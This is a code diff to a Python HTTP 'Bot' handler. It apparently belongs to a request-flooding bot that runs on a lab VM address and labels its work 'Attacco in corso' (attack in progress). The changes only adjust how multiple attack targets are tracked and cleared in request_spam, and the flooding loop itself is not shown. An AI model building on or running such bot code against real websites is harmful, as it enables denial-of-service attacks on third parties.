@@ -12,8 +12,6 @@ from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
 
 server_address = ('10.0.2.15', 15200)
-
-
 # server_address = ('localhost', 15200)
 
 
@@ -129,10 +127,15 @@ class Bot(BaseHTTPRequestHandler):
 
     def request_spam(self, url, e):
 
-        self.current_action.append({
-            "operation": "Attacco in corso",
-            "targets": [url]
-        })
+        if not self.current_action:
+            self.current_action.append({
+                "operation": "Attacco in corso",
+                "targets": [url]
+            })
+        elif self.current_action[0]["operation"] == 'Attacco in corso':
+            self.current_action[0]["targets"].append(url)
+        elif self.current_action[1]["operation"] == 'Attacco in corso':
+            self.current_action[1]["targets"].append(url)
 
         e.clear()
         while not e.is_set():
@@ -148,10 +151,11 @@ class Bot(BaseHTTPRequestHandler):
             else:
                 print(f'Attacco in corso a {url}')
 
-        if self.current_action[0]["operation"] == 'Attacco in corso':
-            self.current_action.pop(0)
-        else:
-            self.current_action.pop(1)
+        if self.current_action:
+            if self.current_action[0]["operation"] == 'Attacco in corso':
+                self.current_action.pop(0)
+            else:
+                self.current_action.pop(1)
 
 
 if __name__ == '__main__':
